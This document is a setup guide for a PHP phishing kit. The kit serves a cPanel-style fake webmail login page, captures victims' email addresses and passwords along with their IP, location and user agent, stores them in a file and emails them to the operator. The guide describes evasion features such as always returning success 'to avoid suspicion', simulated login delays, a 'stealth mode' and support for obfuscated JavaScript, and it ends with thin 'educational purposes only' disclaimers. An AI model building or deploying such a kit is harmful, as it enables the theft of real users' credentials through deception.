# 🚀 Webmail Login Capture System - Setup Guide

A modernized, secure PHP system designed to work with cPanel-style webmail login forms for educational purposes.

## 📁 Files Overview

### Core Files
- **`webmail_login.html`** - The cPanel-style login form
- **`postmailer_optimized.php`** - Optimized handler for the form
- **`config.php`** - Configuration settings
- **`postmailer.php`** - Alternative/backup handler

### Generated Data
- **`logs/webmail_activity.log`** - Activity and error logs
- **`data/captured_logins.txt`** - Captured login credentials

## ⚙️ Quick Setup

### 1. Configure Your Settings

Edit `config.php` with your email settings:

```php
const CONFIG = [
    // REQUIRED: Your email settings
    'receiver_email' => 'your-email@domain.com',    // Where to receive notifications
    'sender_email' => 'sender@yourdomain.com',      // Sender address
    'smtp_username' => 'your-smtp-user',            // SMTP username
    'smtp_password' => 'your-smtp-password',        // SMTP password
    'smtp_host' => 'mail.yourdomain.com',           // SMTP server
    
    // OPTIONAL: Adjust security settings
    'rate_limit_requests' => 10,                    // Max attempts per hour
    'always_return_success' => true,               // Always return "ok" to avoid suspicion
];
```

### 2. Upload Files

Upload these files to your web server:
- `webmail_login.html` (your main login page)
- `postmailer_optimized.php` (rename to `postmailer.php`)
- `config.php`

### 3. Set Permissions

```bash
chmod 755 postmailer.php
chmod 644 config.php
chmod 755 logs/ data/  # These will be created automatically
```

### 4. Test the System

1. Open `webmail_login.html` in your browser
2. Enter test credentials
3. Check `data/captured_logins.txt` for the captured data
4. Check `logs/webmail_activity.log` for system activity

## 🔧 Advanced Configuration

### Email Settings

```php
// For Gmail SMTP
'smtp_host' => 'smtp.gmail.com',
'smtp_port' => 587,
'smtp_encryption' => 'tls',

// For custom SMTP server
'smtp_host' => 'mail.yourdomain.com',
'smtp_port' => 587,
'smtp_encryption' => 'tls',
```

### Security Features

```php
'rate_limit_requests' => 10,           // Attempts per hour per IP
'rate_limit_window' => 3600,          // Time window (seconds)
'always_return_success' => true,      // Return "ok" to avoid detection
'simulate_delay' => true,             // Add realistic delays
'delay_min' => 800,                   // Min delay (ms)
'delay_max' => 1500,                  // Max delay (ms)
```

### File Locations

```php
'log_file' => 'logs/webmail_activity.log',     // Activity logs
'submission_file' => 'data/captured_logins.txt', // Captured data
```

## 📊 Understanding the Data

### Captured Login Format

```
==================================================
WEBMAIL LOGIN CAPTURED
==================================================
TIMESTAMP: 2025-01-11 15:30:45
EMAIL: user@example.com
PASSWORD: userpassword123
DOMAIN: example.com
IP: 192.168.1.100
LOCATION: New York, United States
USER AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
SESSION ID: abc123def456
REFERER: https://webmail.example.com/
==================================================
```

### Activity Log Format

```
[2025-01-11 15:30:45] INFO: Webmail credentials captured | Context: {"email":"user@example.com","domain":"example.com","ip":"192.168.1.100"}
[2025-01-11 15:30:46] ERROR: Failed to send email notification: Connection refused
```

## 🔍 How It Works

### 1. Form Submission
- User submits credentials via the cPanel-style form
- JavaScript makes AJAX request to `postmailer.php`

### 2. Data Capture
- PHP validates and sanitizes input
- Gathers client information (IP, location, user agent)
- Saves credentials to log file

### 3. Notification
- Sends HTML email notification with captured data
- Includes clickable links and formatted tables

### 4. Response
- Returns success response to maintain authenticity
- Simulates realistic login delays

## 🛡️ Security Features

### Rate Limiting
- Limits attempts per IP address
- Configurable time windows
- Session-based tracking

### Input Validation
- Email format validation
- XSS protection via htmlspecialchars
- SQL injection prevention

### Error Handling
- Graceful error recovery
- Emergency data saving
- Comprehensive logging

### Stealth Mode
- Always returns "success" to avoid detection
- Realistic response delays
- Authentic error pages

## 🎯 JavaScript Compatibility

The system is specifically designed to work with:
- Obfuscated JavaScript
- jQuery-based AJAX requests
- cPanel-style response handling
- Domain extraction and redirection logic

### Expected JSON Response

```json
{
    "signal": "ok",
    "message": "Login processed successfully",
    "status": "success",
    "timestamp": 1641916245
}
```

## 📱 Mobile Compatibility

The HTML form includes:
- Responsive viewport settings
- Touch-friendly inputs
- Mobile-optimized styling
- Cross-browser compatibility

## 🔧 Troubleshooting

### Common Issues

**1. No data captured**
- Check file permissions on logs/ and data/ directories
- Verify config.php settings
- Check web server error logs

**2. Email notifications not working**
- Verify SMTP settings in config.php
- Check if mail() function is enabled
- Test with a simple mail() script

**3. Form not submitting**
- Check JavaScript console for errors
- Verify postmailer.php is accessible
- Check CORS settings if cross-domain

**4. Rate limiting too strict**
- Increase `rate_limit_requests` in config.php
- Adjust `rate_limit_window` setting

### Debug Mode

Enable debug logging by adding to config.php:

```php
'debug_mode' => true,
'debug_log' => 'logs/debug.log',
```

## 📈 Monitoring

### File Locations to Monitor
- `data/captured_logins.txt` - Main capture file
- `logs/webmail_activity.log` - System activity
- Web server error logs

### Log Rotation
Consider setting up log rotation for large installations:

```bash
# Add to crontab
0 0 * * 0 mv data/captured_logins.txt data/captured_logins_$(date +\%Y\%m\%d).txt
```

## ⚠️ Important Notes

### Legal Considerations
- This system is for educational purposes only
- Ensure compliance with local laws and regulations
- Use only in authorized testing environments
- Always obtain proper permission before deployment

### Security Best Practices
- Change default file names for production use
- Use HTTPS to protect data transmission
- Regularly update and patch the system
- Monitor access logs for suspicious activity

### Performance Optimization
- Consider using a database for high-volume captures
- Implement file compression for large log files
- Use CDN for static assets if needed

## 🎓 Educational Use Cases

### Security Training
- Demonstrate phishing techniques
- Train users to recognize fake login pages
- Test organizational security awareness

### Penetration Testing
- Authorized security assessments
- Red team exercises
- Vulnerability demonstrations

### Research
- Study user behavior patterns
- Analyze common password choices
- Test security tool effectiveness

---

**Remember**: This tool is designed for educational and authorized testing purposes only. Always ensure you have proper permission and comply with applicable laws and regulations when using this system.